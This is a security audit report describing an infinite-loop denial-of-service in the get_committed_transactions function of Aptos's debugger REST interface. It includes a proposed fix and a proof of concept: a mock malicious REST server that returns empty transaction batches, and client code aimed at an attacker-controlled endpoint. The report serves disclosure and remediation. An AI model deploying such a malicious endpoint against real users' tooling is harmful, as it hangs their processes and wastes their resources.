# Audit Report

## Title
Infinite Loop DoS in RestDebuggerInterface.get_committed_transactions() Due to Lack of Progress Validation

## Summary
The `get_committed_transactions()` function in `RestDebuggerInterface` contains an infinite loop vulnerability where a malicious or compromised REST API endpoint can cause complete denial of service by repeatedly returning empty transaction batches. The function lacks progress tracking, allowing it to loop indefinitely without reaching the requested transaction limit.

## Finding Description

The vulnerable code is located in the `get_committed_transactions()` method: [1](#0-0) 

The while loop condition checks `txns.len() < limit as usize` and repeatedly calls `get_transactions_bcs()`. However, the code makes a critical assumption: that the REST API will either return transactions (making progress) or return an error (terminating the loop via `?`).

In the legitimate API implementation, empty results trigger an error: [2](#0-1) 

However, if an attacker controls the REST API endpoint (through compromise, DNS hijacking, or social engineering), they can return HTTP 200 responses with BCS-encoded empty `Vec<TransactionOnChainData>`. This bypasses the error handling:

**Attack Flow:**
1. User runs debugging tool (aptos-debugger, aptos-e2e-comparison-testing, etc.)
2. Tool configured to connect to attacker-controlled endpoint (via social engineering or DNS hijacking)
3. Tool calls `get_committed_transactions(start=0, limit=100)`
4. Malicious REST API returns: `HTTP 200 OK` with `body: bcs::to_bytes(&Vec::<TransactionOnChainData>::new())`
5. The `into_iter().for_each()` processes zero elements
6. `txns.len()` remains 0
7. Loop continues with same request
8. Steps 4-7 repeat indefinitely

The affected components include: [3](#0-2) [4](#0-3) 

## Impact Explanation

**Severity: High** per Aptos bug bounty criteria ("API crashes" / "Validator node slowdowns")

The vulnerability causes denial of service for critical debugging and testing infrastructure:

1. **Debugging Tools Unavailable**: Operators cannot use aptos-debugger to investigate transaction failures or replay issues
2. **Testing Infrastructure Disrupted**: E2E comparison testing and transaction simulation tools become unusable
3. **Resource Exhaustion**: Infinite loop consumes CPU cycles indefinitely while the process hangs
4. **Operational Impact**: If validator operators use these tools for troubleshooting during incidents, the DoS prevents effective response

While this does not directly affect consensus or transaction processing, it impacts the operational tooling that validator operators and developers rely on for maintaining blockchain health. The tools effectively "crash" (become unresponsive indefinitely) when connected to a malicious endpoint.

## Likelihood Explanation

**Likelihood: Medium**

Attack prerequisites:
- Attacker must cause victim to connect debugging tools to malicious REST API endpoint through:
  - Social engineering (providing malicious endpoint URLs)
  - DNS hijacking/poisoning
  - Man-in-the-middle attacks
  - Compromising legitimate REST API servers

While this requires user error or additional attack vectors, it is realistic in scenarios where:
- Users copy endpoint configurations from untrusted sources
- Internal infrastructure is compromised
- Users test against external/unknown endpoints

The lack of any defensive programming (progress checks, retry limits, timeouts) makes exploitation trivial once the prerequisite is met.

## Recommendation

Implement progress tracking and loop guards in `get_committed_transactions()`:

```rust
async fn get_committed_transactions(
    &self,
    start: Version,
    limit: u64,
) -> Result<(
    Vec<Transaction>,
    Vec<TransactionInfo>,
    Vec<PersistedAuxiliaryInfo>,
)> {
    let mut txns = Vec::with_capacity(limit as usize);
    let mut txn_infos = Vec::with_capacity(limit as usize);
    const MAX_RETRIES: usize = 3;
    let mut empty_response_count = 0;

    while txns.len() < limit as usize {
        let prev_len = txns.len();
        
        self.0
            .get_transactions_bcs(
                Some(start + txns.len() as u64),
                Some(limit as u16 - txns.len() as u16),
            )
            .await?
            .into_inner()
            .into_iter()
            .for_each(|txn| {
                txns.push(txn.transaction);
                txn_infos.push(txn.info);
            });
        
        println!("Got {}/{} txns from RestApi.", txns.len(), limit);
        
        // Detect lack of progress
        if txns.len() == prev_len {
            empty_response_count += 1;
            if empty_response_count >= MAX_RETRIES {
                return Err(anyhow::anyhow!(
                    "REST API returned empty results {} times consecutively. \
                     This may indicate an issue with the endpoint. \
                     Received {}/{} transactions.",
                    MAX_RETRIES, txns.len(), limit
                ));
            }
        } else {
            empty_response_count = 0; // Reset on progress
        }
    }

    // Get auxiliary info...
    let auxiliary_infos = self.0
        .get_persisted_auxiliary_infos(start, limit)
        .await
        .unwrap_or_else(|_e| {
            (0..limit).map(|_| PersistedAuxiliaryInfo::None).collect()
        });

    Ok((txns, txn_infos, auxiliary_infos))
}
```

## Proof of Concept

**Malicious REST API Server (Rust mock):**

```rust
use axum::{routing::get, Router, response::IntoResponse, http::StatusCode};
use aptos_api_types::TransactionOnChainData;

async fn malicious_transactions_handler() -> impl IntoResponse {
    // Return empty array encoded in BCS
    let empty: Vec<TransactionOnChainData> = vec![];
    let bcs_data = bcs::to_bytes(&empty).unwrap();
    
    (StatusCode::OK, bcs_data)
}

#[tokio::main]
async fn main() {
    let app = Router::new()
        .route("/v1/transactions", get(malicious_transactions_handler));
    
    axum::Server::bind(&"0.0.0.0:8080".parse().unwrap())
        .serve(app.into_make_service())
        .await
        .unwrap();
}
```

**Victim Code (triggers infinite loop):**

```rust
use aptos_rest_client::Client;
use aptos_validator_interface::RestDebuggerInterface;

#[tokio::main]
async fn main() {
    let malicious_endpoint = "http://attacker-controlled-endpoint:8080";
    let client = Client::new(malicious_endpoint.parse().unwrap());
    let interface = RestDebuggerInterface::new(client);
    
    // This call will hang indefinitely
    let result = interface.get_committed_transactions(0, 100).await;
    
    // Never reached
    println!("Result: {:?}", result);
}
```

**Expected behavior:** The call hangs indefinitely, consuming CPU while spinning in the while loop.

## Notes

This vulnerability demonstrates a critical failure in defensive programming. While the legitimate Aptos REST API implementation correctly returns errors for empty results, the debugging interface lacks validation against malicious or non-conformant API implementations. The absence of progress tracking, retry limits, or timeout mechanisms at the application level creates a trivial DoS vector once an attacker can influence the REST endpoint configuration.

### Citations

**File:** aptos-move/aptos-validator-interface/src/rest_interface.rs (L221-260)
```rust
    async fn get_committed_transactions(
        &self,
        start: Version,
        limit: u64,
    ) -> Result<(
        Vec<Transaction>,
        Vec<TransactionInfo>,
        Vec<PersistedAuxiliaryInfo>,
    )> {
        let mut txns = Vec::with_capacity(limit as usize);
        let mut txn_infos = Vec::with_capacity(limit as usize);

        while txns.len() < limit as usize {
            self.0
                .get_transactions_bcs(
                    Some(start + txns.len() as u64),
                    Some(limit as u16 - txns.len() as u16),
                )
                .await?
                .into_inner()
                .into_iter()
                .for_each(|txn| {
                    txns.push(txn.transaction);
                    txn_infos.push(txn.info);
                });
            println!("Got {}/{} txns from RestApi.", txns.len(), limit);
        }

        // Get auxiliary info from REST client
        let auxiliary_infos = self
            .0
            .get_persisted_auxiliary_infos(start, limit)
            .await
            .unwrap_or_else(|_e| {
                // Instead of returning an error, return a Vec filled with PersistedAuxiliaryInfo::None
                (0..limit).map(|_| PersistedAuxiliaryInfo::None).collect()
            });

        Ok((txns, txn_infos, auxiliary_infos))
    }
```

**File:** api/src/context.rs (L842-844)
```rust
        let txn_start_version = data
            .get_first_output_version()
            .ok_or_else(|| format_err!("no start version from database"))?;
```

**File:** aptos-move/aptos-debugger/src/aptos_debugger.rs (L44-45)
```rust
    pub fn rest_client(rest_client: Client) -> anyhow::Result<Self> {
        Ok(Self::new(Arc::new(RestDebuggerInterface::new(rest_client))))
```

**File:** aptos-move/aptos-e2e-comparison-testing/src/online_execution.rs (L73-74)
```rust
        Ok(Self::new(
            Arc::new(RestDebuggerInterface::new(rest_client)),
```
